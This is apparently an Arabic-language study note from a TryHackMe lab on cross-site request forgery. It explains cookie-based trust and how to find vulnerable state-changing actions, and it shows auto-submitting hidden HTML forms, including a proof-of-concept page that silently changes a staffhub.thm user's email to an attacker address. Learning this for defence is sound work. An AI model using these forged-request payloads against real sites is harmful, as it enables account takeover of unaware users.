# CSRF Introduction

<img width="1906" height="379" alt="image" src="https://github.com/user-attachments/assets/2d674473-8b83-450d-92f3-f7c3450c2c44" />

---


<details>
  <summary>What is CSRF</summary>



يعني إيه؟


CSRF هو نوع من الثغرات بيخلي **المهاجم يخدع متصفح الضحية** إنه يبعت Request لموقع الضحية عامل فيه Login بالفعل.


ركز في كلمة **browser** (المتصفح)، لأنها أهم كلمة في الموضوع.

المهاجم **مش بيخدع الموقع**...\
هو بيخدع **المتصفح**.


المتصفح كل مرة بيبعت Request للموقع، بيضيف الـ **Session Cookie** تلقائياً.

يعني لو أنت عامل Login على Facebook مثلاً، فالمتصفح بيبعت الـ Cookie مع أي Request يروح لـ Facebook.

أنت مش بتعمل حاجة بنفسك.

المتصفح هو اللي بيضيفها.

مثال:

بدل ما يبعت

```
GET /profile
```

هيبعت

```
GET /profile
Cookie: session=abc123xyz
```

وده بيحصل أوتوماتيك.

---

الموقع لما يشوف الـ Session Cookie يقول:

> آه...\
> ده المستخدم أحمد لسه عامل Login.

فيصدق إن الطلب جاي من أحمد بنفسه.

الموقع **مش بيعرف** إن الطلب جه بسبب صفحة خبيثة.

---


يعني المهاجم بيستغل الثقة بين:

المتصفح ✅

و

الموقع ✅

الموقع بيقول:

"طالما الـ Cookie صحيحة يبقى صاحب الحساب هو اللي بعت الطلب."

وده الخطأ.

---

لو الـ Request بتعمل حاجة مهمة.

زي مثلاً:

-   تغيير الإيميل
-   تغيير الباسورد
-   تحويل فلوس
-   حذف حساب



المهاجم يغير بيانات الضحية...

والضحية أصلاً متعرفش.

وده أخطر جزء.


---



![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481672467.png)






## example

تخيل الموظف فاتح موقع الشركة.

وعامل Login.

بعدها فتح موقع تاني.

مثلاً

```
funnycats.com
```

> لكن الموقع ده خبيث.


الموقع الخبيث يبعت Request لموقع الشركة.

من غير ما المستخدم يحس.

مثلاً يعمل

```
<form action="https://company.com/change-email">
```

ويعمل Submit لوحده.



لو الموقع **مش بيتأكد** إن الطلب جاي من صفحاته هو...

يبقى عنده مشكلة.

ودي أصل ثغرة CSRF.


---

## How CSRF Works


Step 1
------



الضحية تعمل Login.

مثلاً

```
bank.com
```

* * * * *



المتصفح يحفظ

```
session=ABC123
```

في الـ Cookies.

* * * * *

Step 2
------



المهاجم يخلي الضحية تدخل موقع خبيث.

مثلاً يبعته على Discord.

أو Email.

أو إعلان.

أو لينك.

* * * * *

Step 3
------



المتصفح يرسل Request.

هو اللي أرسلها...

مش الضحية.

* * * * *



ويضيف الـ Cookie تلقائياً.

يعني يبعت:

```
POST /change-password
Cookie: session=ABC123
```

* * * * *



الموقع يشوف الـ Cookie.

* * * * *


ويقول:

تمام.

ده المستخدم الحقيقي.

نفذ الطلب.










  
</details>



<details>
  <summary>Why CSRF Works</summary>



 فكرة CSRF ببساطة
-------------------

CSRF بيحصل لما موقع يثق في أي Request جاي له طالما فيه **Session Cookie صحيحة**، حتى لو الطلب اتبعت من موقع خبيث.

* * * * *

 ليه الثغرة بتشتغل؟
---------------------

-   المتصفح بيبعت الـ **Cookies تلقائيًا مع أي طلب لنفس الدومين**
-   الموقع بيعتبر أي طلب فيه Cookie صحيحة = طلب شرعي من المستخدم
-   الموقع **مش بيتأكد مين اللي عمل الطلب فعليًا**

* * * * *

 السيناريو
------------

1.  المستخدم يعمل Login على موقع (مثلاً staffhub.thm)
2.  المتصفح يخزن Session Cookie
3.  المستخدم يدخل موقع خبيث
4.  الموقع الخبيث يجبر المتصفح يبعت Request لموقع staffhub
5.  المتصفح يضيف الـ Cookie تلقائي
6.  السيرفر ينفذ الطلب لأنه شايفه طلب من المستخدم الحقيقي

* * * * *


![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481729380.png)



⚠️ الشروط عشان CSRF يشتغل
-------------------------

لازم 3 حاجات:

1.  المستخدم يكون عامل Login
2.  فيه عملية مهمة (تغيير بيانات / فلوس / إعدادات)
3.  الموقع مايتحققش من مصدر الطلب (No CSRF protection)


  
</details>




<details>
  <summary>Finding CSRF Vulnerabilities</summary>


 الفكرة العامة
================

قبل ما تفكر تعمل exploit، لازم تسأل نفسك:

> هل فيه action في الموقع ممكن يتعمل **من غير ما الموقع يتأكد إن المستخدم هو اللي عمله؟**

لو الإجابة "أيوه" → ممكن يكون فيه CSRF.

* * * * *

 إيه اللي بنستهدفه في CSRF؟
=============================

> **CSRF attacks usually focus on actions that change data**

يعني مش أي حاجة.

مش هدفنا:

-   عرض صفحة
-   قراءة بيانات

هدفنا:

-   تغيير حاجة

زي:

-   تغيير الإيميل
-   تغيير الباسورد
-   تعديل إعدادات الحساب
-   عمليات مالية

 لأن دي اسمها **state-changing actions**\
يعني بتغير حالة الحساب.

* * * * *

 

هل الموقع بيتأكد إن الطلب ده جاي من:

-   صفحة أصلية؟
-   ولا أي موقع تاني يقدر يزوّره؟

لو مفيش تحقق → احتمال CSRF عالي جدًا.

* * * * *

 إيه اللي بنبص عليه في الموقع؟
================================

أثناء الفحص، ركز على أي Request فيها:

-   تغيير بيانات حساب
-   Update profile
-   Change email/password
-   Delete account
-   Financial actions

 دي غالبًا أماكن CSRF

* * * * *

 نقطة مهمة جدًا
=================

> **Common functions with CSRF vulnerabilities**

أي feature بتعدل بيانات المستخدم غالبًا هدف.

ليه؟

لأنها:

-   بتعتمد على Session Cookie
-   وغالبًا ما بتعملش تحقق قوي

* * * * *

 GET vs POST (غلط شائع)
=========================

> **Many developers think POST protects from CSRF**

ده خطأ كبير.

* * * * *

الحقيقة:
--------

### GET:

```
GET /change-email?email=hacker@test.com
```

ده سهل جدًا يتعمله exploit (link أو image)

* * * * *

### POST:

```
POST /change-emailemail=hacker@test.com
```

برضه ممكن يتعمله exploit عادي جدًا من صفحة خبيثة.

* * * * *

الخلاصة:
--------

> ❌ نوع الطلب (GET/POST) مش حماية\
> ✅ الحماية الحقيقية لازم تكون CSRF Token أو تحقق Origin

* * * * *

 ليه POST مش حماية؟
=====================

لأن أي صفحة خبيثة تقدر تعمل:

```html
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@test.com">
</form>

<script>
document.forms[0].submit();
</script>
```

والمتصفح هيبعت الـ Cookie تلقائي.


  
</details>




<details>
  <summary>Exploitation using HTML Form</summary>


## login website and go to settings to change email you will found form 

```html
<form action="update_email.php" method="POST">
    <div class="input-field">
        <i class="material-icons prefix">alternate_email</i>
        <input id="email" type="email" name="email" required>
        <label for="email">New Email Address</label>
    </div>

    <button class="btn waves-effect waves-light teal btn-rounded" type="submit">
        Update Email
        <i class="material-icons right">save</i>
    </button>
</form>
```


## poc

### cd **`/var/www/html`** create **`settings.html`**

```html
<html>
<body>

<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
    <input type="hidden" name="email" value="attacker@evilmail.thm">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>

</body>
</html>
```




  
</details>











































